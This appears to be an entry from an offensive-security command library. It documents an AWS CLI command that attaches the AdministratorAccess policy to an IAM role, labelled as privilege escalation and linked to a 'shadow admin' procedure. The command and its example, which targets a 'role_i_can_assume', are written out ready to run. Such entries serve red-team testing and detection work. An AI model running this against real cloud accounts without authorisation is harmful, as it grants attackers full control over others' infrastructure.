---
id: 798925e5-3d50-490d-85f2-a894e40fa1de
name: aws-iam-attach-admin-policy-to-role
type: command
executor: bash
data: >-
  aws iam attach-role-policy --role-name $_ROLE_NAME --policy-arn
  arn:aws:iam::aws:policy/AdministratorAccess
output: null
created_at: '2023-04-06T03:56:09.318359+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - AWS
tags:
  - iam
  - privilege-escalation
verified: true
validated: true
---

# aws-iam-attach-admin-policy-to-role

## Command

```bash
aws iam attach-role-policy --role-name $_ROLE_NAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## Description

Attaches the AWS AdministratorAccess managed policy to an IAM role for full privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --role-name $_ROLE_NAME | Name of the target role | Yes |
| --policy-arn | ARN of AdministratorAccess policy | Yes |

## Examples

### Basic Usage

```bash
aws iam attach-role-policy --role-name role_i_can_assume --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## Expected Output

No output on success; use list-attached-role-policies to verify.

## Related

- [[procedures/AWS-Shadow-Admin-Access]]
